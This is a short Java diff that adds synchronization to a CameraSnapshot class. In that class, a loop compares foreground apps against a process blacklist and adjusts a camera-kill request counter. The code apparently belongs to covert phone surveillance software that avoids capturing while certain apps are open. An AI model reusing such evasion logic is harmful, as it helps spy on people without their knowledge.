@@ -126,21 +126,24 @@ public class CameraSnapshot {
 		if( Status.self().getForeground_activity()!=null && Status.self().getForeground_activity().baseActivity != null){
 			check_this.add(Status.self().getForeground_activity().baseActivity.toString());
 		}
-		for (String lasfg : check_this) {
-			for (String bl : blacklist) {
-				if (lasfg.contains(bl.toLowerCase())) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (incKillreqCamera): process=" + bl + " in blacklist , skip increments and reset");
+		synchronized (this) {
+			for (String lasfg : check_this) {
+				for (String bl : blacklist) {
+					if (lasfg.contains(bl.toLowerCase())) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (incKillreqCamera): process=" + bl
+									+ " in blacklist , skip increments and reset");
+						}
+						kill_camera_request = 0;
+						return;
 					}
-					kill_camera_request = 0;
-					return;
 				}
 			}
 		}
 		kill_camera_request++;
 	}
 
-	public int getCamera_killed() {
+	public synchronized int getCamera_killed() {
 		return camera_killed;
 	}
 
